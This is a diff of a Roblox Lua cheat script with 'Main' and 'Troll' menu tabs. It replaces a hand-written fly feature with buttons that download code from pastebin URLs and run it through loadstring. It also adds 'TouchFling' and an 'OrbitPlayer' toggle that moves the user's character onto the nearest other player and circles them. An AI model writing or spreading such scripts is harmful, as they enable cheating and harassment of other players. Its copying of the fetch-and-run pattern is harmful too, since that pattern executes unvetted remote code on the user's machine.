@@ -248,80 +248,17 @@ b.RenderStepped:Connect(function()
 end)
    end,
 })
-local flying = false
-local player = game.Players.LocalPlayer
-local userInput = game:GetService("UserInputService")
-local runService = game:GetService("RunService")
-
-local bodyGyro, bodyVelocity
-local flyConnection
-
-local function setupFlyParts(char)
-    local hrp = char:WaitForChild("HumanoidRootPart")
-
-    bodyGyro = Instance.new("BodyGyro")
-    bodyGyro.P = 9e4
-    bodyGyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-    bodyGyro.CFrame = hrp.CFrame
-    bodyGyro.Parent = hrp
-
-    bodyVelocity = Instance.new("BodyVelocity")
-    bodyVelocity.Velocity = Vector3.zero
-    bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-    bodyVelocity.Parent = hrp
-
-    flyConnection = runService.RenderStepped:Connect(function()
-        if flying then
-            local cam = workspace.CurrentCamera
-            local moveDir = Vector3.zero
-            if userInput:IsKeyDown(Enum.KeyCode.W) then moveDir += cam.CFrame.LookVector end
-            if userInput:IsKeyDown(Enum.KeyCode.S) then moveDir -= cam.CFrame.LookVector end
-            if userInput:IsKeyDown(Enum.KeyCode.A) then moveDir -= cam.CFrame.RightVector end
-            if userInput:IsKeyDown(Enum.KeyCode.D) then moveDir += cam.CFrame.RightVector end
-            if userInput:IsKeyDown(Enum.KeyCode.Space) then moveDir += cam.CFrame.UpVector end
-            if userInput:IsKeyDown(Enum.KeyCode.LeftControl) then moveDir -= cam.CFrame.UpVector end
-            if moveDir.Magnitude > 0 then
-                bodyVelocity.Velocity = moveDir.Unit * 45
-            else
-                bodyVelocity.Velocity = Vector3.zero
-            end
-            bodyGyro.CFrame = cam.CFrame
-        end
-    end)
-end
-
-local function stopFlying()
-    if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
-    if bodyVelocity then bodyVelocity:Destroy() bodyVelocity = nil end
-    if flyConnection then flyConnection:Disconnect() flyConnection = nil end
-end
-
-player.CharacterAdded:Connect(function(char)
-    char:WaitForChild("Humanoid").Died:Connect(function()
-        stopFlying()
-        if flying then
-            player.CharacterAdded:Wait()
-            setupFlyParts(player.Character)
-        end
-    end)
-    if flying then
-        setupFlyParts(char)
-    end
-end)
-
-local Toggle = Main:CreateToggle({
-    Name = "Fly",
-    CurrentValue = false,
-    Flag = "Toggle1",
-    Callback = function(Value)
-        flying = Value
-        local char = player.Character or player.CharacterAdded:Wait()
-        if flying then
-            setupFlyParts(char)
-        else
-            stopFlying()
-        end
-    end,
+local Button = Main:CreateButton({
+   Name = "Fly",
+   Callback = function()
+   loadstring(game:HttpGet("https://pastebin.fi/r/qjLPAGd", true))()
+   end,
+})
+local Button = Troll:CreateButton({
+   Name = "TouchFling",
+   Callback = function()
+   loadstring(game:HttpGet("https://pastebin.com/raw/LgZwZ7ZB", true))()
+   end,
 })
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
@@ -398,3 +335,93 @@ local Toggle2 = Troll:CreateToggle({
 		end
 	end,
 })
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local orbiting = false
+local orbitLoop
+
+local function getNearestPlayer()
+	local localPlayer = game.Players.LocalPlayer
+	local myChar = localPlayer.Character
+	if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return nil end
+
+	local closestPlayer = nil
+	local shortestDistance = math.huge
+
+	for _, player in ipairs(game.Players:GetPlayers()) do
+		if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+			local distance = (player.Character.HumanoidRootPart.Position - myChar.HumanoidRootPart.Position).Magnitude
+			if distance < shortestDistance then
+				shortestDistance = distance
+				closestPlayer = player
+			end
+		end
+	end
+
+	return closestPlayer
+end
+
+local function startOrbiting()
+	local player = game.Players.LocalPlayer
+	local char = player.Character or player.CharacterAdded:Wait()
+	local hrp = char:WaitForChild("HumanoidRootPart")
+
+	local target = getNearestPlayer()
+	if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
+	local targetHRP = target.Character.HumanoidRootPart
+
+	local distance = (targetHRP.Position - hrp.Position).Magnitude
+	local speed = 10
+	local time = distance / speed
+
+	local moveTween = TweenService:Create(hrp, TweenInfo.new(time, Enum.EasingStyle.Linear), {CFrame = CFrame.new(targetHRP.Position + Vector3.new(5, 0, 0))})
+	moveTween:Play()
+	moveTween.Completed:Wait()
+
+	local angle = 0
+	local radius = 3
+	local heightOffset = 2
+	local orbitSpeed = 1
+
+	orbitLoop = RunService.Heartbeat:Connect(function(dt)
+		if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
+		targetHRP = target.Character.HumanoidRootPart
+
+		angle += orbitSpeed * dt
+		local orbitX = math.cos(angle) * radius
+		local orbitZ = math.sin(angle) * radius
+		local orbitPos = targetHRP.Position + Vector3.new(orbitX, heightOffset, orbitZ)
+		local orbitCFrame = CFrame.new(orbitPos, targetHRP.Position)
+
+		hrp.CFrame = orbitCFrame
+	end)
+end
+
+local function stopOrbiting()
+	if orbitLoop then
+		orbitLoop:Disconnect()
+		orbitLoop = nil
+	end
+end
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+	if orbiting then
+		stopOrbiting()
+		startOrbiting()
+	end
+end)
+
+local Toggle3 = Troll:CreateToggle({
+	Name = "OrbitPlayer",
+	CurrentValue = false,
+	Flag = "Toggle3",
+	Callback = function(Value)
+		orbiting = Value
+		if orbiting then
+			startOrbiting()
+		else
+			stopOrbiting()
+		end
+	end,
+})
+
